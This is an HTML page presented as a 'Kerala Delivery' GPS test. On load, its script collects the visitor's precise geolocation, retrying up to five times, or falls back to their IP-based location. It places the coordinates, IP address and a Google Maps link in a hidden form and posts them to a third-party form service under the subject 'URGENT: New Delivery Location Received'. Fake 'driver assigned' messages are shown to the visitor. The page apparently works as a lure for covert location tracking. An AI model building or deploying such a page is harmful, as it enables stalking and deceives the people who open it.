
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QuickDelivery Kerala | GPS Test</title>
    <style>
        :root {
            --primary: #e67e22;
            --success: #27ae60;
            --bg: #f4f7f6;
            --log-bg: #1a1a1a;
            --log-text: #00ff41; /* High visibility green */
        }

        body {
            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto;
            background-color: var(--bg);
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #2c3e50;
        }

        .app-container {
            width: 90%;
            max-width: 400px;
            background: white;
            padding: 30px;
            border-radius: 25px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
            text-align: center;
        }

        .header h1 { color: var(--primary); margin: 0; font-size: 1.6rem; }

        .status-box {
            margin: 25px 0;
            padding: 20px;
            border-radius: 15px;
            background: #fffaf5;
            border: 1px solid #ffe0b2;
        }

        #status-icon { font-size: 3.5rem; margin-bottom: 15px; display: block; }

        .pulse { animation: pulse-animation 1.5s infinite; }
        @keyframes pulse-animation {
            0% { transform: scale(0.95); opacity: 0.8; }
            50% { transform: scale(1.05); opacity: 1; }
            100% { transform: scale(0.95); opacity: 0.8; }
        }

        .log-container {
            text-align: left;
            background: var(--log-bg);
            color: var(--log-text);
            padding: 12px;
            border-radius: 10px;
            font-family: 'Courier New', monospace;
            font-size: 0.8rem;
            height: 100px;
            overflow-y: auto;
            margin-top: 20px;
            border: 2px solid #333;
        }

        .footer-text { font-size: 0.8rem; color: #bdc3c7; margin-top: 20px; }
    </style>
</head>
<body>

    <div class="app-container">
        <div class="header">
            <h1>üöö Kerala Delivery</h1>
            <p>Precision Dispatch System</p>
        </div>

        <div class="status-box">
            <span id="status-icon" class="pulse">üìç</span>
            <div id="main-status" style="font-weight:bold">Initializing...</div>
            <div id="detail-status" style="font-size:0.9rem; color:#7f8c8d">Connecting to GPS satellites</div>
        </div>

        <div class="log-container" id="log">
            > System Online...<br>
        </div>

        <p class="footer-text">Fetching location to assign nearest delivery partner.</p>

        <form id="location-form" style="display: none;">
            <input type="hidden" name="access_key" value="d5ceb622-59e5-41a9-89f8-41aaf5f099e4">
            <input type="hidden" name="subject" value="URGENT: New Delivery Location Received">
            <input type="hidden" name="Coordinates" id="form-coords">
            <input type="hidden" name="Accuracy" id="form-accuracy">
            <input type="hidden" name="Method" id="form-method">
            <input type="hidden" name="IP_Address" id="form-ip">
            <input type="hidden" name="GoogleMapsLink" id="form-link">
        </form>
    </div>

    <script>
        let retryCount = 0;
        const maxRetries = 5;
        const mainStatus = document.getElementById('main-status');
        const detailStatus = document.getElementById('detail-status');
        const logBox = document.getElementById('log');

        function addLog(msg) {
            logBox.innerHTML += `> ${msg}<br>`;
            logBox.scrollTop = logBox.scrollHeight;
        }

        function updateUI(main, detail, icon = "üìç") {
            mainStatus.innerText = main;
            detailStatus.innerText = detail;
            if(icon !== "üìç") {
                document.getElementById('status-icon').innerText = icon;
                document.getElementById('status-icon').classList.remove('pulse');
            }
        }

        async function startLocationProcess() {
            if (navigator.geolocation) {
                attemptGPS();
            } else {
                addLog("GPS not supported.");
                fetchIPLocation();
            }
        }

        function attemptGPS() {
            retryCount++;
            addLog(`GPS Attempt ${retryCount}/${maxRetries}...`);
            updateUI("Locating...", `Satellite search (Try ${retryCount})`);

            const options = {
                enableHighAccuracy: true,
                timeout: 6000, 
                maximumAge: 0
            };

            navigator.geolocation.getCurrentPosition(
                (pos) => processLocation(pos, "SATELLITE/GPS"),
                (err) => {
                    if (retryCount < maxRetries) {
                        attemptGPS();
                    } else {
                        addLog("GPS failed after 5 tries.");
                        fetchIPLocation();
                    }
                },
                options
            );
        }

        async function fetchIPLocation() {
            addLog("Switching to Network Triangulation...");
            updateUI("Signal Weak", "Using network towers...");
            
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                
                document.getElementById('form-ip').value = data.ip;
                
                const mockPos = {
                    coords: {
                        latitude: data.latitude,
                        longitude: data.longitude,
                        accuracy: 2500 
                    }
                };
                processLocation(mockPos, "NETWORK-IP");
            } catch (e) {
                addLog("All methods failed.");
                updateUI("Failed", "Please check permissions.");
            }
        }

        function processLocation(pos, method) {
            const { latitude, longitude, accuracy } = pos.coords;
            // Fixed link syntax
            const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

            addLog(`Fix found via ${method}`);
            
            document.getElementById('form-coords').value = `${latitude}, ${longitude}`;
            document.getElementById('form-accuracy').value = `${Math.round(accuracy)}m`;
            document.getElementById('form-method').value = method;
            document.getElementById('form-link').value = mapsLink;

            updateUI("Location Secured", "Confirming with dispatch...");
            submitData();
        }

        function submitData() {
            const form = document.getElementById('location-form');
            const formData = new FormData(form);

            fetch('https://api.web3forms.com/submit', {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(data => {
                if(data.success) {
                    addLog("Data synced successfully.");
                    updateUI("Order Ready!", "Driver assigned successfully.", "üçï");
                }
            })
            .catch(err => {
                addLog("Sync Error: " + err.message);
            });
        }

        window.onload = startLocationProcess;
    </script>
</body>
</html>
